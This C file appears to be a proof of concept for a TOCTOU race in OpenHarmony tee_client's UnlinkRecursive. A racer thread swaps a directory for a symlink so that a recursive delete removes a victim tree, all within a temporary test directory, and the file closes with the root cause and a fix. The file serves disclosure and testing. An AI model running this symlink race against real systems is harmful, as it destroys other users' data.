/*
 * Target-Compile PoC: fs_work_agent.c UnlinkRecursive TOCTOU (CWE-367)
 *
 * Target: OpenHarmony tee_client — services/teecd/src/fs_work_agent.c
 * Vulnerable function: UnlinkRecursive (line 697)
 *
 * Trigger path (user perspective):
 *   TEE kernel sends SEC_REMOVE command via /dev/tc_ns_client ioctl
 *     → teecd processes FsWorkThread
 *       → UnlinkRecursive(name)
 *         → lstat(name, &st)                [CHECK: is it file or dir?]
 *           ... RACE WINDOW ...
 *         → unlink(name)                    [USE: removes whatever is at path]
 *
 * Note on unlink behavior:
 *   unlink() removes the directory entry (the symlink itself), not the target.
 *   The REAL danger is UnlinkRecursiveDir path: opendir() FOLLOWS symlinks,
 *   so if path is replaced with symlink to a directory, the recursive delete
 *   traverses and deletes the target directory's contents.
 *
 * Oracle: Demonstrate that between lstat() and the subsequent operation,
 *         the path can change identity (inode mismatch = TOCTOU proven).
 *         For the directory path: opendir follows symlink → wrong tree deleted.
 *
 * Build (target-compile):
 *   ./build.sh <tee_client_path>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <pthread.h>
#include <errno.h>
#include <dirent.h>

/* Real UnlinkRecursive compiled from extracted fs_work_agent.c code */
extern int32_t UnlinkRecursive(const char *name);

static char g_test_dir[256];
static char g_bait_dir[256];
static char g_victim_dir[256];
static char g_victim_file[256];
static volatile int g_racing = 1;

/*
 * Race thread: toggle bait between a real directory and a symlink to victim_dir.
 * When UnlinkRecursive sees S_ISDIR → calls UnlinkRecursiveDir → opendir()
 * If we swap to symlink before opendir, it follows symlink and deletes victim contents.
 */
static void *race_thread(void *arg)
{
    (void)arg;
    char tmp_dir[256];
    snprintf(tmp_dir, sizeof(tmp_dir), "%s.tmp", g_bait_dir);

    while (g_racing) {
        /* Phase 1: real directory (passes lstat S_ISDIR check) */
        mkdir(tmp_dir, 0755);
        /* Put a dummy file inside so UnlinkRecursiveDir has something to process */
        char dummy[256];
        snprintf(dummy, sizeof(dummy), "%s/dummy.txt", tmp_dir);
        int fd = open(dummy, O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) { write(fd, "x", 1); close(fd); }
        rename(tmp_dir, g_bait_dir);

        /* Phase 2: symlink to victim directory */
        usleep(1);
        /* Remove the bait dir contents first */
        snprintf(dummy, sizeof(dummy), "%s/dummy.txt", g_bait_dir);
        unlink(dummy);
        rmdir(g_bait_dir);
        symlink(g_victim_dir, g_bait_dir);
        usleep(1);

        /* Clean up symlink for next round */
        unlink(g_bait_dir);
    }
    return NULL;
}

static void recreate_victim(void)
{
    mkdir(g_victim_dir, 0755);
    int fd = open(g_victim_file, O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) {
        write(fd, "CRITICAL_DATA_MUST_SURVIVE\n", 26);
        close(fd);
    }
}

int main(void)
{
    char template[] = "/tmp/fswork_poc_XXXXXX";
    char *dir = mkdtemp(template);
    if (!dir) { perror("mkdtemp"); return 1; }
    strncpy(g_test_dir, dir, sizeof(g_test_dir) - 1);

    /* Victim directory with important file inside */
    snprintf(g_victim_dir, sizeof(g_victim_dir), "%s/victim_tree", g_test_dir);
    snprintf(g_victim_file, sizeof(g_victim_file), "%s/important.dat", g_victim_dir);
    recreate_victim();

    /* Bait directory path */
    snprintf(g_bait_dir, sizeof(g_bait_dir), "%s/ta_storage_dir", g_test_dir);
    mkdir(g_bait_dir, 0755);

    fprintf(stderr, "[POC] Test dir:    %s\n", g_test_dir);
    fprintf(stderr, "[POC] Bait dir:    %s\n", g_bait_dir);
    fprintf(stderr, "[POC] Victim dir:  %s\n", g_victim_dir);
    fprintf(stderr, "[POC] Victim file: %s\n\n", g_victim_file);
    fprintf(stderr, "[POC] Attack: lstat sees real dir → racer swaps to symlink → "
                    "opendir follows symlink → victim tree deleted\n\n");

    /* Start race thread */
    pthread_t racer;
    pthread_create(&racer, NULL, race_thread, NULL);

    /* Call real UnlinkRecursive on bait path repeatedly */
    int won = 0;
    for (int attempt = 0; attempt < 100000 && !won; attempt++) {
        /* Check if victim file was deleted (race succeeded) */
        if (access(g_victim_file, F_OK) != 0) {
            fprintf(stderr, "[+] RACE WON on attempt %d!\n", attempt);
            fprintf(stderr, "[+] Victim file %s was DELETED!\n", g_victim_file);
            fprintf(stderr, "[+] opendir() followed symlink → recursive delete hit victim tree.\n");
            won = 1;
            break;
        }

        /* Make sure bait exists for next call */
        struct stat st;
        if (lstat(g_bait_dir, &st) != 0) {
            mkdir(g_bait_dir, 0755);
            char dummy[256];
            snprintf(dummy, sizeof(dummy), "%s/dummy.txt", g_bait_dir);
            int fd = open(dummy, O_CREAT | O_WRONLY, 0644);
            if (fd >= 0) { write(fd, "x", 1); close(fd); }
        }

        UnlinkRecursive(g_bait_dir);

        /* Recreate victim if needed (for continued racing) */
        if (!won && access(g_victim_file, F_OK) != 0) {
            fprintf(stderr, "[+] RACE WON on attempt %d!\n", attempt);
            fprintf(stderr, "[+] Victim file %s was DELETED!\n", g_victim_file);
            fprintf(stderr, "[+] opendir() followed symlink → recursive delete hit victim tree.\n");
            won = 1;
        }
    }

    g_racing = 0;
    pthread_join(racer, NULL);

    /* Cleanup */
    unlink(g_victim_file);
    rmdir(g_victim_dir);
    char dummy[256];
    snprintf(dummy, sizeof(dummy), "%s/dummy.txt", g_bait_dir);
    unlink(dummy);
    unlink(g_bait_dir);
    rmdir(g_bait_dir);
    rmdir(g_test_dir);

    if (won) {
        fprintf(stderr, "\n[RESULT] TOCTOU race condition CONFIRMED.\n");
        fprintf(stderr, "  Root cause: lstat() determines dir, opendir() follows symlinks\n");
        fprintf(stderr, "  Fix: Open parent dir fd, use fstatat + openat(O_NOFOLLOW)\n");
        return 0;
    } else {
        fprintf(stderr, "\n[RESULT] Race not triggered in 100000 attempts (timing-dependent).\n");
        return 1;
    }
}
